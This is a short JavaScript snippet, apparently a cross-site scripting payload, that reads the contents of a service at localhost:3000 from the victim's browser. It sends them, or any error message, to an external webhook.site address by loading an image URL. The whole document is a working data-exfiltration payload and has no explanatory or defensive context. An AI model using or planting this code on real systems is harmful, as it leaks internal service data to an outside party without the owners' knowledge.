fetch('http://localhost:3000')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?port3000=' + encodeURIComponent(data);
  })
  .catch(err => {
    new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?port3000_err=' + err.message;
  });
